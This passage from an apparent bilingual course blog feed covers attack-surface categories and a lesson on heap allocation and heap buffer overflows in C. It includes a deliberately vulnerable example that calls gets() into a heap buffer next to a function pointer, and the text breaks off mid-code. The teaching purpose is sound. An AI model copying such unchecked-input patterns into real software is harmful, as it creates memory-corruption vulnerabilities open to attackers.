解释：此类漏洞可能存在于程序代码中，被攻击者利用来执行未授权的操作或获取系统权限。&lt;br&gt;
示例：
&lt;ul&gt;
&lt;li&gt;Web 服务器软件漏洞：攻击者通过注入恶意代码、SQL 注入或缓冲区溢出来获取服务器控制权或访问敏感信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;人类攻击面 (Human Attack Surface)&lt;br&gt;
 定义：人类攻击面是指由于人员或外部人员的行为所造成的漏洞。&lt;br&gt;
解释：攻击者可以通过社会工程、人为错误或信任的内部人员来攻击系统。&lt;br&gt;
示例：
&lt;ul&gt;
&lt;li&gt;社会工程：攻击者通过伪装身份或操纵用户情感来骗取敏感信息。&lt;/li&gt;
&lt;li&gt;人为错误：员工在处理信息时的失误可能会导致数据泄露或系统损坏。&lt;/li&gt;
&lt;li&gt;信任的内部人员：有访问权限的员工或合作伙伴可能会恶意使用他们的权限来获取未授权的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Security Implementation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Prevention: it is an ideal security scheme is one in which no attack is successful. Although not practical in all cases, there are threats in which prevention is a reasonable goal&lt;/li&gt;
&lt;li&gt;Detection: if absolute protection is not feasible, it may be practical to detect security attacks&lt;/li&gt;
&lt;li&gt;Response: if an ongoing attack is detected, the system can respond to halt the attack and prevent further damage&lt;/li&gt;
&lt;li&gt;Recovery: if data integrity is compromised, a prior, correct copy of the data can be reloaded&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/Heap-buffer-overflow/</guid>
            <title>Heap buffer overflow</title>
            <link>http://example.com/course/Heap-buffer-overflow/</link>
            <category>C</category>
            <category>software security</category>
            <pubDate>Mon, 28 Oct 2024 21:57:22 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Heap allocation&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Heap allocation&#34;&gt;#&lt;/a&gt;Heap allocation&lt;/h1&gt;
&lt;h2 id=&#34;Memory Allocation&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Memory Allocation&#34;&gt;#&lt;/a&gt;Memory Allocation&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Static memory&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Store global variables, permanent for the entire lifetime of the process&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Automatic memory&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Stack stores local variables, stackframes are added or removed for functional calls&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Dynamic memory&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Heap stores shared data structures in a large pool of memory&lt;/li&gt;
&lt;li&gt;Not allocated in contiguous order 由程序员管理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Stack Allocation&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stack Allocation&#34;&gt;#&lt;/a&gt;Stack Allocation&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Stack is contiguous blocks of memory managed by OS&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Cannot be modified&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Stack grows and shrinks as functions are called and exited&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Usually has an upper bound, may raise exceptions&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Variables are allocated and freed automatically&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Only exist when the function that created them is active on the stack&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Heap Allocation&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Heap Allocation&#34;&gt;#&lt;/a&gt;Heap Allocation&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Heap is noncontiguous blocks of memory managed by the programmer&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Can be modified programatically&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Heap is large and boundless, usually limited by only the physical memory available&lt;/li&gt;
&lt;li&gt;Variables are allocated and freed by using library functions or build-in language constructs&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;C calls standard library functions, e.g. malloc, realloc, calloc and free&lt;/li&gt;
&lt;li&gt;C++ also uses these functions, but adds build-in operators new and delete&lt;/li&gt;
&lt;li&gt;Pointers are required to access data on the heap&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Memory Allocation Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x;  &lt;span class=&#34;comment&#34;&gt;// 静态变量，存储在静态内存区，生命周期与进程相同&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y;          &lt;span class=&#34;comment&#34;&gt;// 栈变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *str;      &lt;span class=&#34;comment&#34;&gt;// 指向堆内存的指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     y = &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;stack memory: %d\n&amp;quot;&lt;/span&gt;, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;comment&#34;&gt;// 分配 100 个字符的堆内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     str = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     str[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;m&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;heap memory: %c\n&amp;quot;&lt;/span&gt;, str[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;comment&#34;&gt;// 释放分配的堆内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;  &lt;span class=&#34;comment&#34;&gt;// 栈上的局部变量 y 和 str 会在这里被自动释放&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/28/671f7e7bed371.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Stack&lt;/th&gt;
&lt;th&gt;Heap&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Basic&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Memory is allocated in a contiguous block&lt;/td&gt;
&lt;td&gt;Memory is allocated in any random order&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Allocation and Deallocation&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Automatic by compiler instructions&lt;/td&gt;
&lt;td&gt;Manual by programmer&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Cost&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Less&lt;/td&gt;
&lt;td&gt;More&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Implementation&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Hard&lt;/td&gt;
&lt;td&gt;Easy&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Access time&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Faster&lt;/td&gt;
&lt;td&gt;Slower&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Main Issue&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Shortage of memory&lt;/td&gt;
&lt;td&gt;Memory fragmentation&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Locality of reference&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Excellent&lt;/td&gt;
&lt;td&gt;Adequate&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Flexibility&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Fixed size&lt;/td&gt;
&lt;td&gt;Resizing is possible&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Data type structure&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Linear&lt;/td&gt;
&lt;td&gt;Hierarchical&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;Heap buffer overflow&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Heap buffer overflow&#34;&gt;#&lt;/a&gt;Heap buffer overflow&lt;/h1&gt;
&lt;h2 id=&#34;Dereference&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Dereference&#34;&gt;#&lt;/a&gt;Dereference&lt;/h2&gt;
&lt;p&gt;Much harder to exploit heap overflows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Heap memory is not flat or contiguous&lt;/li&gt;
&lt;li&gt;There is no return address saved on the heap&lt;/li&gt;
&lt;li&gt;The address to overwrite is hard to find&lt;/li&gt;
&lt;li&gt;General exploitation techniques manipulate the metadata used by memory allocator&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To read/write the value inside the memory address pointed to by the pointer&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Dereference a Pointer&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *p; &lt;span class=&#34;comment&#34;&gt;// p 是一个指向整数的指针  *p is an integer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; x = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;  &lt;span class=&#34;comment&#34;&gt;// x 现在等于 0 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p = &amp;amp;x; &lt;span class=&#34;comment&#34;&gt;// p 指向 x 的地址   now *p == 0, since *p == x&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; *p = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// 相当于 x = 1，因为 p == &amp;amp;x&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	     &lt;span class=&#34;comment&#34;&gt;// 现在 *p 和 x 都等于 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;A C-language structure is a basic data structure that holds multiple fields&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Dereference a Structure Pointer&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;MY_STRUCT&lt;/span&gt; &amp;#123;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; my_int; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;float&lt;/span&gt; my_float; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; MY_STRUCT_T; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; MY_STRUCT_T info = &amp;#123;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3.141593F&lt;/span&gt;&amp;#125;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; MY_STRUCT_T *instance = &amp;amp;info; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a = info.my_int;        &lt;span class=&#34;comment&#34;&gt;// 使用 &amp;#x27;.&amp;#x27; 操作符选择字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b = (*instance).my_int; &lt;span class=&#34;comment&#34;&gt;// 解引用后选择字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c = instance-&amp;gt;my_int;   &lt;span class=&#34;comment&#34;&gt;// &amp;#x27;-&amp;gt;&amp;#x27; 是前一种情况的语法糖&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;访问结构体字段的三种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;info.my_int&lt;/code&gt; ：使用  &lt;code&gt;.&lt;/code&gt;  操作符直接访问结构体变量  &lt;code&gt;info&lt;/code&gt;  中的字段  &lt;code&gt;my_int&lt;/code&gt; 。这是最简单的访问方式，因为  &lt;code&gt;info&lt;/code&gt;  是结构体变量，不是指针。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*instance&lt;/code&gt; ：解引用指针  &lt;code&gt;instance&lt;/code&gt; ，获取它指向的结构体  &lt;code&gt;info&lt;/code&gt; 。 &lt;code&gt;(*instance)&lt;/code&gt;  代表结构体本身。&lt;br&gt;
 &lt;code&gt;(*instance).my_int&lt;/code&gt; ：在解引用后使用 &lt;code&gt;.&lt;/code&gt;  操作符访问结构体字段  &lt;code&gt;my_int&lt;/code&gt; 。这种方式相当于对 info 变量的直接访问，只不过是通过指针来完成的。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;instance-&amp;gt;my_int&lt;/code&gt; ： &lt;code&gt;-&amp;gt;&lt;/code&gt;  是一种简便写法（语法糖），用于访问指针指向的结构体的字段。这相当于  &lt;code&gt;(*instance).my_int&lt;/code&gt; ，但写法更加简洁。 &lt;code&gt;-&amp;gt;&lt;/code&gt;  只能用于指针，而  &lt;code&gt;.&lt;/code&gt;  用于直接的结构体变量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Heap Overflow&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Heap Overflow&#34;&gt;#&lt;/a&gt;Heap Overflow&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Simple Heap Overflow&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Simple Heap Overflow&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;target&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;];        &lt;span class=&#34;comment&#34;&gt;// 易受攻击的缓冲区&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*fun)(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *);  &lt;span class=&#34;comment&#34;&gt;// 函数指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;span class=&#34;type&#34;&gt;target_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *buf)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;comment&#34;&gt;// 目标函数，可能被攻击者控制的数据替换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;target_t&lt;/span&gt; *rec = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;target_t&lt;/span&gt;)); &lt;span class=&#34;comment&#34;&gt;// 动态分配结构体内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     rec-&amp;gt;fun = foo; &lt;span class=&#34;comment&#34;&gt;// 将函数指针初始化为 foo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     gets(rec-&amp;gt;buf); &lt;span class=&#34;comment&#34;&gt;// 易受攻击的函数，可能导致缓冲区溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     rec-&amp;gt;fun(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// 调用函数指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;结构体定义&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;target&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span 